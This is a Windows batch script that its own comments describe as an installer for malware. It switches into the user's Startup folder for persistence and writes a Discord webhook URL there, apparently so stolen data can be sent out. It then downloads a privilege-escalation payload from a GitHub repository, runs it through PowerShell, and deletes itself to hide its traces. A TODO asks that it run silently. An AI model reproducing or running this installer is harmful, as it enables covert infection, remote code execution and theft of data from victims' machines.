@rem Installer for the malware
@rem TODO: Make the CMD prompt run silently

@echo off
set "CurrentDirectory=%CD%"
set "StartupDirectory=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"

@REM Change directory to startup
cd /d "%StartupDirectory%"

@REM Change to your Discord Webhook URL
echo https://discord.com/api/webhooks/1167014901038993510/j2oWTYLE3mhwIjTAvOOCh3CauMLSWlzSQCtBoL5UEzTfGasfXSdO4TCtBHSsRbEb6YWD > DiscordWebhookURL.icu

@REM Download required files

powershell -command "Invoke-WebRequest -Uri 'https://github.com/ReylanTeo/IControlU/blob/f49099d8d113b227d42a031886fca74aba4cf772/Payload/PrivilegeEscalation.cmd' -OutFile 'PrivilegeEscalation.cmd'"
powershell -ExecutionPolicy RemoteSigned -File "PrivilegeEscalation.cmd"

@REM @REM Delete the EstablishConnection file
@REM del "EstablishConnection.ps1"

@REM @REM Delete the Discord Webhook file
@REM del "DiscordWebhookURL.icu"

@REM Delete the original installer
cd /d %CurrentDirectory%
del "Installer.cmd"